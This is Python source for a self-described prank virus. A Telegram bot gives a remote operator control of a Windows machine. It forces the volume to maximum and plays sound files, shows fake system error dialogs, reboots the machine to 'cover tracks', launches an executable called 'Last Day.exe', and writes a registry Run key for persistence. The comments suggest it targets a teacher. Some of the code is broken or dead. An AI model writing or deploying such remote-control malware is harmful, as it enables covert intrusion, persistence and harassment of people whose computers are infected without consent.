from operator import neg
import telebot # Для функции управления с помощью ТГ
from telebot import types # Для функции управления с помощью ТГ
# from telebot.apihelper import ApiTelegramException # Хрень используемая для не работающей функции проверки доступа к админки
from tkinter import messagebox as mb # Для фейковой ошибки (/error текст)
import winsound # Проигрывание .wav файлов
import pyvolume # Библиотека для изменения уровня громкости
import time # Использованна по приколу
import os # Фича с крашем
import subprocess
import winreg as reg
import path
import shutil

# Говнокодинный вирусс прикол пранк MrDimon
# Надеюсь прочитал сам гитхаб поэтому вопросов мало



def extract_arg(arg): # Для аргумента в команде /error
    return arg.split()[1:]

#def is_subscribed(chat_id, user_id): # Сломанная функция
    try:
        bot.get_chat_member(-4110230173, 1258446750)
        return True
    except ApiTelegramException as e:
        if e.result_json['description'] == 'Bad Request: user not found':
            return False

#lalka = 000000000 # Чат ИД группы (Использован в сломанной функции)
bot = telebot.TeleBot('') # Токен для бота лол

@bot.message_handler(commands=['start'])
def start(message):
        user = message.from_user.id
        #f not is_subscribed(lalka, user):
    # ПОЛОМАННАЯ ХУЙНЯ         #bot.send_message(message.chat.id, "Братан, ты не Слава Мерлоу,  если ты хочешь стать им то [хуячь это](https://forms.gle/tJnYevcTcJa34d847)", parse_mode='MarkdownV2')
        #else:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True) # Размечаем клаву
        btn1 = types.KeyboardButton('Проверить коннект (Debug фича)')
        btn2 = types.KeyboardButton('Помощь')
        btn3 = types.KeyboardButton('Проиграть Димона')
        btn5 = types.KeyboardButton('Проиграть Гимн.ukruine') # Асу
        btn4 = types.KeyboardButton('100 % звук')
        btn6 = types.KeyboardButton('барбарики')
        btn7 = types.KeyboardButton('bombarda')
        btn8 = types.KeyboardButton('autorun')
        btn9 = types.KeyboardButton('Снеси табло Физичке')
        markup.add(btn1, btn2, btn3, btn5, btn4,btn6,btn7,btn8,btn9)
        bot.send_message(user, 'Вилькомин!)', reply_markup=markup)
@bot.message_handler(commands=['error'])
def error(message): # Команда для отправки фейковой ошибки
    status = extract_arg(message.text)
    mb.showerror("Windows Environment", status)
@bot.message_handler(commands=['crash']) # Команда для краша скрипта
def crash(message):
     user = message.from_user.id
     bot.send_message(user, "заметание следов начато")
     os.system("shutdown /r /t 1")
@bot.message_handler(content_types=['text']) # Функционал кнопок
def get_text_messages(message):
     user = message.from_user.id
     if message.text == "Проверить коннект (Debug фича)": # Проверка коннектиона, доступна при консольном варианте билдинга
          bot.send_message(user, "Проверка коннекта выполнена. Сервер получит уведомление!")
          print("ВНИМАНИЕ! Админка запросила проверку коннекта! Чат Айди запросившого : " + str(user))
     elif message.text == "100 % звук": # Ставит звук на сотку
          bot.send_message(user, "Ставим звук сотку)))")
          pyvolume.custom(100)
     elif message.text == "Помощь": # Помощь соотвественно
          bot.send_message(user, "Хелпа по командам : \n /error текст - отправляет ошибку с вашим текстом \n /crash - крашит скрипт))")
     elif message.text == "Проиграть Димона": # Проигрывает файл dim.wav
          bot.send_message(user, "Выкручиваем звук на полную")
          pyvolume.custom(percent=100)
          time.sleep(1)
          bot.send_message(user, "Проигрывание Димона началось")
          baspushka = 0
          while baspushka == 5000:
               pyvolume.custom(percent=100)
          winsound.PlaySound('dim.wav', winsound.SND_FILENAME)
          bot.send_message(user, "Демон Димон съеаблся")
     elif message.text == "Проиграть Гимн.ukruine": # Проигрывает файл wmi.wav
          bot.send_message(user, "Слава Yкраiне 🇺🇦")
          pyvolume.custom(percent=100)
          winsound.PlaySound('wmi.wav', winsound.SND_FILENAME)
          bot.send_message(user, "Асу асу") 
     elif message.text == "барбарики": # Проигрывает файл wmi.wav
          bot.send_message(user, "барбарики играют")
          pyvolume.custom(percent=100)
          winsound.PlaySound('barbariki.wav', winsound.SND_FILENAME)
          bot.send_message(user, "Асу асу")
     elif message.text == "bombarda":
          subprocess.run(['Last Day.exe'], capture_output=True, text=True)
          bot.send_message(user, 'последний день запущен')
     elif message.text == "autorun": 
               key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 1, reg.KEY_SET_VALUE)

        # Путь к вашему исполняемому файлу
               exe_path ="D:\\Mindustry\\mindustry.exe" 

        # Добавляем запись в реестр для автозапуска
               reg.SetValueEx(key, "Mfa", 1, reg.REG_SZ, exe_path)
               reg.CloseKey(key)
               bot.send_message(user, "автозапуск установлен")
     elif message.text == "Снеси табло Физичке":
          pyvolume.custom(percent=100)
          winsound.PlaySound('tablo.wav', winsound.SND_FILENAME)
          bot.send_message(user, "сундный день выполнен")
bot.polling()
